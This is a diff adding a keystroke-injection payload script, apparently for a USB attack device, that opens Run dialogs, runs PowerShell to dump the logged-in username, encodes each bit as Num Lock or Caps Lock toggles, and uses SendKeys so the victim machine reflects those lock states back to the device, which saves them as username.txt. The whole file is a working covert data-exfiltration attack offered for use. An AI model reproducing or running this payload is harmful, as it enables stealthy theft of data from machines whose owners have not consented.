@@ -1,0 +1,40 @@
+WAITFOR_INIT
+ALLOW_EXIT
+
+REM save username of currently logged in user into $env:tmp\x.txt
+GUI r
+DELAY 100
+STRING powershell "$env:username > $env:tmp\x.txt"
+ENTER
+DELAY 100
+
+GUI r
+DELAY 100
+REM use contents of $env:tmp\x.txt as byte array, define mask array
+STRING powershell "$ba = cat -en by $env:tmp\x.txt; $ma = 128,64,32,16,8,4,2,1; foreach($b in $ba)
+
+REM encode $env:tmp\x.txt into lock key sequence inside $o variable
+STRING {foreach($m in $ma){ if($b -band $m){$o+='%{NUMLOCK}'}else{$o+='%{CAPSLOCK}'} }};
+
+REM add SCROLLLOCK to mark the end, save lock key sequence into $env:tmp\y.txt
+STRING $o+='%{SCROLLLOCK}'; $o > $env:tmp\y.txt"
+ENTER
+DELAY 100
+
+REM enable keystroke reflection, save incoming data into username.txt
+KEYREFLECT_START
+
+GUI r
+DELAY 100
+REM tell host to type out lock sequence encoded in y.txt
+STRING powershell "$o = cat $env:tmp\y.txt; Add-Type -As System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("$o")"
+ENTER
+DELAY 100
+
+REM wait until host is done sending all bits for keystroke reflection
+KEYREFLECT_SAVE username.txt
+
+REM turn all LED's off after payload completion
+SETNUM_OFF
+SETCAPS_OFF
+SETSCROLL_OFF
